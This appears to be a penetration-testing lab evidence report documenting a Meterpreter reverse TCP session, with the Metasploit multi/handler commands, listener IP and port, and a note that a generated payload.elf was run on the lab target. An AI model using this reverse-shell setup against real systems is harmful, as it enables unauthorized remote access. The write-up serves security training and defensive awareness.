# Evidence 03 — Reverse TCP

## Objective

The objective of this step was to demonstrate a Reverse TCP connection using a Metasploit-compatible Meterpreter payload in an authorized laboratory environment.

## Reverse TCP Concept

In a Reverse TCP connection, the target initiates an outbound TCP connection toward the configured listener.

The communication model is:

    Target
       |
       | TCP connection
       ↓
    Attacker / Multi Handler

The listener waits on the configured `LHOST` and `LPORT`.

## Lab Configuration

| Parameter | Value |
|---|---|
| Attacker / Listener | Kali Linux |
| Listener IP | `192.168.164.128` |
| Listener Port | `4444` |
| Payload | `linux/x86/meterpreter/reverse_tcp` |
| Connection Type | Reverse TCP |

## Payload

The payload generated in the previous step was:

    payload.elf

The payload was configured with:

    LHOST = 192.168.164.128
    LPORT = 4444

The payload was intended exclusively for execution within the authorized laboratory environment.

## Handler Configuration

The Metasploit Multi/Handler was configured with the same payload and connection parameters:

    use exploit/multi/handler

    set PAYLOAD linux/x86/meterpreter/reverse_tcp

    set LHOST 192.168.164.128

    set LPORT 4444

    run

The handler then waited for the Reverse TCP connection.

## Payload Execution

The generated payload was transferred to and executed on the authorized laboratory target.

The target initiated a TCP connection toward:

    192.168.164.128:4444

## Session Establishment

After the payload connected back to the configured listener, Metasploit reported that a session had been established.

The resulting session provided access to the Meterpreter interface within the authorized laboratory environment.

## Connection Flow

    ┌───────────────┐
    │ Authorized    │
    │ Target        │
    │               │
    │ payload.elf   │
    └───────┬───────┘
            │
            │ Reverse TCP
            │
            ▼
    ┌───────────────┐
    │ Kali Linux    │
    │ Multi/Handler │
    │               │
    │ 192.168.164.128
    │ Port 4444     │
    └───────────────┘

## Security Relevance

Reverse TCP connections are important to understand during penetration testing because they demonstrate how a compromised system can initiate an outbound connection toward an authorized assessment system.

From a defensive perspective, unexpected outbound connections can be investigated through:

- Firewall logs
- Network monitoring
- IDS/IPS alerts
- Egress filtering
- Endpoint security monitoring

## Evidence Screenshot

The following screenshot provides evidence of the Reverse TCP connection and the resulting Metasploit session.

![Reverse TCP Session](../screenshots/03-reverse-tcp.png)

## Result

The authorized laboratory payload successfully established a Reverse TCP connection with the configured Metasploit listener.

A Meterpreter session was established through the Reverse TCP communication channel.

## Conclusion

The Reverse TCP practical demonstrated the complete communication flow between a compatible payload and the Metasploit Multi/Handler.

The target initiated the connection toward the listener, resulting in an authorized Meterpreter session.

## Authorization

This activity was performed exclusively within an authorized cybersecurity laboratory environment for educational and security-training purposes.

No unauthorized systems were targeted.
